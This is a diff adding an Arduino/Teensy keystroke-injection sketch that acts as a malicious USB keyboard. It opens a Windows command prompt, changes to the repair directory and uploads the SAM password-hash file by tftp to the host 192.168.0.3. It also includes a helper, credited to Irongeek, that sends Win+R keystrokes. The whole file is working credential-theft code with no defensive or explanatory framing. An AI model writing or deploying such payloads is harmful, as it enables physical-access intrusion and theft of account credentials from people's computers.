@@ -1,0 +1,28 @@
+void setup() {} 
+void loop () 
+{ 
+  delay(5000); 
+  CommandAtRunBar("cmd"); 
+  delay(5000); 
+  Keyboard.print("cd C:\\WINDOWS\\repair\\\n"); 
+  delay(5000); 
+  Keyboard.print("tftp 192.168.0.3 PUT sam sam\n"); 
+  delay(9000000); 
+  
+} 
+
+//From Irongeek for the commands on the keyboard... 
+void CommandAtRunBar(char *SomeCommand){ 
+Keyboard.set_modifier(128); //Windows key 
+Keyboard.set_key1(KEY_R); // use r key 
+Keyboard.send_now(); // send strokes 
+Keyboard.set_modifier(0); //prep release of control keys 
+Keyboard.set_key1(0); //have to do this to keep it from hitting key multiple times. 
+Keyboard.send_now(); //Send the key changes 
+delay(1500); 
+Keyboard.print(SomeCommand); 
+Keyboard.set_key1(KEY_ENTER); 
+Keyboard.send_now(); 
+Keyboard.set_key1(0); 
+Keyboard.send_now(); 
+} 
